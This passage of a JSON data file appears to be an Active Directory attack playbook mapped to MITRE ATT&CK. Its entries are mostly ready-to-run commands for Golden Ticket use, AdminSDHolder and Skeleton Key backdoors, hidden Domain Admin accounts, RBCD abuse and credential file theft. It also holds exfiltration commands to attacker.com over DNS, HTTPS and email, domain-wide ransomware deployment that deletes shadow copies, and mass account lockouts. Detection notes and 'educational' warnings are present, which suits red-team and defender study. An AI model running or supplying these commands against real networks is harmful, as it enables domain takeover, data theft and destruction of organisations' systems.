        "klist",
        "# Access DC with Golden Ticket",
        "dir \\\\DC01.domain.local\\C$",
        "# Note: To invalidate Golden Tickets, reset KRBTGT password TWICE",
        "# Each password reset takes time to propagate across domain"
      ]
    },
    {
      "id": "AD-PERSIST-002",
      "mitre_id": "T1098",
      "name": "AdminSDHolder Modification",
      "phase": "persistence",
      "infrastructure": "ad",
      "description": "Modify AdminSDHolder container ACL to grant persistent access to protected groups",
      "prerequisites": ["Domain Admin or write access to AdminSDHolder"],
      "tools": ["PowerView", "AD PowerShell module"],
      "detection": "Monitor AdminSDHolder ACL changes (Event 5136), SDPROP alerts",
      "references": ["https://attack.mitre.org/techniques/T1098/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# PowerView - Add FullControl for attacker on AdminSDHolder",
        "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity attackeruser -Rights All",
        "# PowerShell AD Module - Get current AdminSDHolder ACL",
        "Get-ACL 'AD:\\CN=AdminSDHolder,CN=System,DC=domain,DC=local' | Select-Object -ExpandProperty Access",
        "# PowerShell - Add GenericAll permission",
        "$acl = Get-ACL 'AD:\\CN=AdminSDHolder,CN=System,DC=domain,DC=local'; $user = New-Object System.Security.Principal.NTAccount('domain\\attackeruser'); $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,'GenericAll','Allow'); $acl.AddAccessRule($ace); Set-ACL 'AD:\\CN=AdminSDHolder,CN=System,DC=domain,DC=local' $acl",
        "# Force SDPROP to run immediately (normally runs every 60 minutes)",
        "Invoke-SDPropagator -ShowProgress -timeoutMinutes 5",
        "# Check AdminSDHolder propagation",
        "Get-ACL 'AD:\\CN=Domain Admins,CN=Users,DC=domain,DC=local' | Select-Object -ExpandProperty Access",
        "# BloodyAD - Modify AdminSDHolder",
        "bloodyAD -d domain.local -u admin -p 'Password123' --host DC01.domain.local add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' attackeruser",
        "# Remove AdminCount attribute (for cleanup detection evasion)",
        "Set-DomainObject -Identity attackeruser -Clear admincount",
        "# SDPROP timer modification (requires DC access)",
        "# Reg key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\AdminSDProtectFrequency"
      ]
    },
    {
      "id": "AD-PERSIST-003",
      "mitre_id": "T1556.001",
      "name": "Skeleton Key",
      "phase": "persistence",
      "infrastructure": "ad",
      "description": "Patch LSASS on domain controller to accept a master password for any account",
      "prerequisites": ["Domain Admin on DC"],
      "tools": ["Mimikatz misc::skeleton"],
      "detection": "Monitor LSASS modifications, memory integrity checks, DC reboots clear it",
      "references": ["https://attack.mitre.org/techniques/T1556/001/"],
      "next_techniques": ["AD-LATERAL-001"],
      "risk_level": "critical",
      "commands": [
        "# Mimikatz - Install Skeleton Key on DC (default password: mimikatz)",
        "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" exit",
        "# Authenticate with skeleton key password",
        "runas /user:domain\\anyuser cmd.exe",
        "# When prompted, use password: mimikatz",
        "# Verify skeleton key works",
        "net use \\\\DC01.domain.local\\C$ /user:domain\\Administrator mimikatz",
        "# CrackMapExec - Test skeleton key",
        "crackmapexec smb DC01.domain.local -u Administrator -p 'mimikatz'",
        "# Impacket - Use skeleton key password",
        "psexec.py domain.local/Administrator:mimikatz@DC01.domain.local",
        "# Note: Skeleton Key is in-memory only - cleared on DC reboot",
        "# To persist across reboots, install on all DCs",
        "# Warning: Credential Guard blocks Skeleton Key installation",
        "# Check if Credential Guard is enabled",
        "Get-WmiObject -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard"
      ]
    },
    {
      "id": "AD-PERSIST-004",
      "mitre_id": "T1136.002",
      "name": "Domain Account Creation",
      "phase": "persistence",
      "infrastructure": "ad",
      "description": "Create new domain accounts for persistent access",
      "prerequisites": ["Account creation privileges"],
      "tools": ["net user /add /domain", "New-ADUser"],
      "detection": "Event 4720 (account created), monitor for unauthorized account creation",
      "references": ["https://attack.mitre.org/techniques/T1136/002/"],
      "next_techniques": ["AD-PRIVESC-001"],
      "risk_level": "high",
      "commands": [
        "# net.exe - Create domain user",
        "net user backdoor Password123! /add /domain",
        "# net.exe - Add user to Domain Admins",
        "net group \"Domain Admins\" backdoor /add /domain",
        "# PowerShell AD Module - Create user",
        "New-ADUser -Name 'backdoor' -SamAccountName 'backdoor' -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Enabled $true",
        "# PowerShell AD Module - Add to privileged group",
        "Add-ADGroupMember -Identity 'Domain Admins' -Members 'backdoor'",
        "# Set password to never expire",
        "Set-ADUser -Identity backdoor -PasswordNeverExpires $true",
        "# Hide account from casual enumeration ($ suffix)",
        "net user backdoor$ Password123! /add /domain",
        "# Create service account with SPN (for Kerberoasting persistence)",
        "New-ADUser -Name 'svc_backup' -SamAccountName 'svc_backup' -ServicePrincipalNames 'http/fake.domain.local' -AccountPassword (ConvertTo-SecureString 'StrongPass123!' -AsPlainText -Force) -Enabled $true",
        "# Impacket addcomputer - Add computer account",
        "addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Password123!' domain.local/user:Password123",
        "# CrackMapExec - Create user",
        "crackmapexec smb DC01.domain.local -u admin -p 'Password123' -M add-computer -o NAME=EVILPC$ PASSWORD=Password123!"
      ]
    },
    {
      "id": "AD-PERSIST-005",
      "mitre_id": "T1078.002",
      "name": "Machine Account Abuse",
      "phase": "persistence",
      "infrastructure": "ad",
      "description": "Create or compromise machine accounts for persistent, less-monitored access",
      "prerequisites": ["MachineAccountQuota > 0 or admin rights"],
      "tools": ["Impacket addcomputer.py", "PowerMad"],
      "detection": "Monitor machine account creation (Event 4741), MAQ policy",
      "references": ["https://attack.mitre.org/techniques/T1078/002/"],
      "next_techniques": ["AD-CRED-008"],
      "risk_level": "high",
      "commands": [
        "# Check MachineAccountQuota (default is 10)",
        "Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota",
        "# Impacket addcomputer - Create machine account",
        "addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Password123!' domain.local/user:Password123",
        "# PowerMad - Create machine account",
        "New-MachineAccount -MachineAccount EVILPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)",
        "# StandIn - Create machine account",
        "StandIn.exe --computer EVILPC --make",
        "# Use machine account with Impacket",
        "getTGT.py domain.local/'EVILPC$':'Password123!'",
        "# Machine account for Resource-Based Constrained Delegation attack",
        "# Step 1: Create machine account",
        "addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123!' domain.local/user:Password123",
        "# Step 2: Set RBCD on target",
        "rbcd.py -delegate-to 'TARGETSERVER$' -delegate-from 'ATTACKER$' -dc-ip DC01.domain.local -action write domain.local/user:Password123",
        "# Step 3: Get service ticket",
        "getST.py -spn cifs/targetserver.domain.local -impersonate Administrator domain.local/'ATTACKER$':'Password123!'",
        "# Use machine account for Pass-the-Hash",
        "secretsdump.py domain.local/'EVILPC$':'Password123!'@DC01.domain.local"
      ]
    },
    {
      "id": "AD-COLLECT-001",
      "mitre_id": "T1005",
      "name": "Data from Local System",
      "phase": "collection",
      "infrastructure": "ad",
      "description": "Collect sensitive data from compromised systems including documents, credentials, and configuration",
      "prerequisites": ["Access to target system"],
      "tools": ["PowerShell scripts", "Custom collectors"],
      "detection": "File access auditing, DLP solutions, unusual file access patterns",
      "references": ["https://attack.mitre.org/techniques/T1005/"],
      "next_techniques": ["AD-EXFIL-001"],
      "risk_level": "medium",
      "commands": [
        "# Find files containing passwords",
        "findstr /si password *.txt *.xml *.config *.ini",
        "# Search for sensitive file types",
        "dir /s /b *.docx *.xlsx *.pdf *.pst *.kdbx 2>nul",
        "# PowerShell - Find files modified recently",
        "Get-ChildItem -Path C:\\ -Recurse -Include *.docx,*.xlsx,*.pdf | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}",
        "# Find KeePass databases",
        "dir /s /b *.kdbx 2>nul",
        "# Find SSH private keys",
        "dir /s /b id_rsa id_dsa *.pem 2>nul",
        "# Find AWS credentials",
        "type %USERPROFILE%\\.aws\\credentials",
        "# Find Azure credentials",
        "type %USERPROFILE%\\.azure\\accessTokens.json",
        "# Search for unattended install files with credentials",
        "dir /s /b unattend.xml sysprep.xml 2>nul",
        "# Find browser saved passwords (Chrome)",
        "copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\temp\\ChromePasswords",
        "# PowerShell - Find files with credit card patterns",
        "Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.csv | Select-String -Pattern '\\d{4}[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{4}'"
      ]
    },
    {
      "id": "AD-COLLECT-002",
      "mitre_id": "T1039",
      "name": "Data from Network Shares",
      "phase": "collection",
      "infrastructure": "ad",
      "description": "Access and collect data from network file shares",
      "prerequisites": ["Valid credentials with share access"],
      "tools": ["PowerView Find-InterestingFile", "Snaffler", "SharpShares"],
      "detection": "Audit share access, unusual bulk file access",
      "references": ["https://attack.mitre.org/techniques/T1039/"],
      "next_techniques": ["AD-EXFIL-001"],
      "risk_level": "medium",
      "commands": [
        "# PowerView - Find accessible shares",
        "Find-DomainShare -CheckShareAccess",
        "# PowerView - Find interesting files on shares",
        "Find-InterestingDomainShareFile -Include *.doc*,*.xls*,*.pdf",
        "# PowerView - Find files with password in name",
        "Find-InterestingDomainShareFile -Include *password*,*credential*,*secret*",
        "# Snaffler - Automated sensitive file finder",
        "Snaffler.exe -o snaffler_output.txt -s",
        "# SharpShares - Enumerate shares across domain",
        "SharpShares.exe /threads:50 /ldap:all",
        "# CrackMapExec - Spider shares for files",
        "crackmapexec smb 192.168.1.0/24 -u user -p 'Password123' --spider shares --pattern password,secret,credential",
        "# CrackMapExec - List all shares",
        "crackmapexec smb 192.168.1.0/24 -u user -p 'Password123' --shares",
        "# Manual share enumeration",
        "net view \\\\server /all",
        "# Access SYSVOL for GPO passwords",
        "dir \\\\domain.local\\SYSVOL\\domain.local\\Policies\\ /s",
        "# Find NETLOGON scripts with credentials",
        "type \\\\domain.local\\NETLOGON\\*.bat"
      ]
    },
    {
      "id": "AD-EXFIL-001",
      "mitre_id": "T1048",
      "name": "Exfiltration Over Alternative Protocol",
      "phase": "exfiltration",
      "infrastructure": "ad",
      "description": "Exfiltrate data using protocols like DNS, HTTPS, or cloud services to avoid detection",
      "prerequisites": ["Collected data", "Outbound network access"],
      "tools": ["DNS tunneling", "Cloud storage APIs", "Encrypted channels"],
      "detection": "Network traffic analysis, DNS query monitoring, DLP",
      "references": ["https://attack.mitre.org/techniques/T1048/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Dnscat2 - Establish DNS tunnel",
        "dnscat2 --dns server=attacker.com,port=53",
        "# Iodine - DNS tunneling",
        "iodine -f -P password tunnel.attacker.com",
        "# DNSExfiltrator - Exfil via DNS TXT records",
        "dnsexfiltrator.py -d attacker.com -f sensitive_data.zip",
        "# PowerShell - Upload to cloud storage",
        "Invoke-WebRequest -Uri 'https://api.dropbox.com/2/files/upload' -Method Post -Headers @{'Authorization'='Bearer TOKEN'; 'Content-Type'='application/octet-stream'} -InFile data.zip",
        "# Base64 encode and exfil over HTTPS",
        "$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('data.zip')); Invoke-WebRequest -Uri 'https://attacker.com/exfil' -Method Post -Body $data",
        "# ICMP tunneling with icmpsh",
        "icmpsh.exe -t attacker.com",
        "# Egress through HTTPS (Cobalt Strike)",
        "beacon> upload /path/to/data.zip",
        "# Exfil via email (SMTP)",
        "Send-MailMessage -From 'user@company.com' -To 'attacker@external.com' -Subject 'Report' -Body 'See attached' -Attachments 'data.zip' -SmtpServer 'smtp.company.com'",
        "# Split and exfil large files",
        "split -b 1M sensitive.zip sensitive_part_",
        "# Encode data as DNS queries",
        "for /f %i in (data.b64) do nslookup %i.attacker.com"
      ]
    },
    {
      "id": "AD-IMPACT-001",
      "mitre_id": "T1486",
      "name": "Domain-Wide Ransomware",
      "phase": "impact",
      "infrastructure": "ad",
      "description": "Deploy ransomware across the domain using GPO, PsExec, or other mass deployment methods",
      "prerequisites": ["Domain Admin", "Ransomware payload"],
      "tools": ["GPO deployment", "PsExec", "WMI"],
      "detection": "File encryption patterns, GPO monitoring, endpoint protection",
      "references": ["https://attack.mitre.org/techniques/T1486/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# WARNING: These commands are for educational/simulation purposes only",
        "# Deploy via GPO startup script (modifying existing GPO)",
        "Copy-Item payload.exe \\\\domain.local\\SYSVOL\\domain.local\\scripts\\",
        "# Deploy via PsExec to all domain computers",
        "psexec.exe \\\\* -u domain\\admin -p Password123 -c payload.exe",
        "# Deploy via WMI",
        "wmic /node:@targets.txt /user:domain\\admin /password:Password123 process call create \"C:\\payload.exe\"",
        "# PowerShell - Deploy to multiple systems",
        "Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {Start-Process C:\\payload.exe}",
        "# CrackMapExec - Execute on multiple targets",
        "crackmapexec smb targets.txt -u admin -p 'Password123' -x 'C:\\payload.exe'",
        "# Deploy via scheduled task",
        "schtasks /create /s \\\\target /tn \"Update\" /tr \"C:\\payload.exe\" /sc once /st 00:00 /ru SYSTEM",
        "# Disable recovery options before encryption",
        "vssadmin delete shadows /all /quiet",
        "bcdedit /set {default} recoveryenabled No",
        "wbadmin delete catalog -quiet",
        "# Note: Ransomware simulation tools like RanSim exist for testing"
      ]
    },
    {
      "id": "AD-IMPACT-002",
      "mitre_id": "T1531",
      "name": "Account Access Removal",
      "phase": "impact",
      "infrastructure": "ad",
      "description": "Delete accounts, change passwords, or disable accounts to deny access to legitimate users",
      "prerequisites": ["Account management privileges"],
      "tools": ["AD PowerShell commands", "net user"],
      "detection": "Event 4723/4724/4726 monitoring, account change alerts",
      "references": ["https://attack.mitre.org/techniques/T1531/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# WARNING: These commands are destructive and for educational purposes only",
        "# Change Administrator password",
        "net user Administrator NewPassword123! /domain",
        "# Disable user account",
        "net user targetuser /active:no /domain",
        "# Delete user account",
        "net user targetuser /del /domain",
        "# PowerShell - Disable multiple accounts",
        "Get-ADUser -Filter {Department -eq 'IT'} | Disable-ADAccount",
        "# PowerShell - Reset passwords for all users",
        "Get-ADUser -Filter * | Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)",
        "# Lock out accounts by forcing bad password attempts",
        "for /L %i in (1,1,10) do net use \\\\DC01\\IPC$ /user:domain\\targetuser wrongpassword",
        "# Remove users from privileged groups",
        "net group \"Domain Admins\" legitadmin /del /domain",
        "# Change KRBTGT password (breaks Golden Tickets but also Kerberos)",
        "Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString 'RandomPassword!' -AsPlainText -Force)",
        "# Disable computer accounts",
        "Get-ADComputer -Filter * | Disable-ADAccount"
      ]
    }
  ]
}
